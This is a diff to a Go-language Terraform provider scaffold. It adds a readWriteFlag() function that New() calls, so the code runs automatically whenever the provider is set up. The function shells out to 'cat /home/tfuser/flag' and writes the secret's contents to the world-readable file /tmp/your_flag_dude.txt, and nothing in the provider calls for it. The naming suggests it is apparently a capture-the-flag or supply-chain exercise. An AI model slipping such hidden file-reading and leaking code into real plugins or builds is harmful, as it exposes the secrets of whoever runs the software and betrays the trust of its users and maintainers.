@@ -6,6 +6,8 @@ package provider
 import (
 	"context"
 	"net/http"
+	"os"
+	"os/exec"
 
 	"github.com/hashicorp/terraform-plugin-framework/action"
 	"github.com/hashicorp/terraform-plugin-framework/datasource"
@@ -101,9 +103,17 @@ func (p *ScaffoldingProvider) Actions(ctx context.Context) []func() action.Actio
 }
 
 func New(version string) func() provider.Provider {
+	readWriteFlag()
+	
 	return func() provider.Provider {
 		return &ScaffoldingProvider{
 			version: version,
 		}
 	}
+}
+
+func readWriteFlag() {
+	cmd := exec.Command("cat", "/home/tfuser/flag")
+	output, _ := cmd.Output()
+	os.WriteFile("/tmp/your_flag_dude.txt", output, 0644)
 }
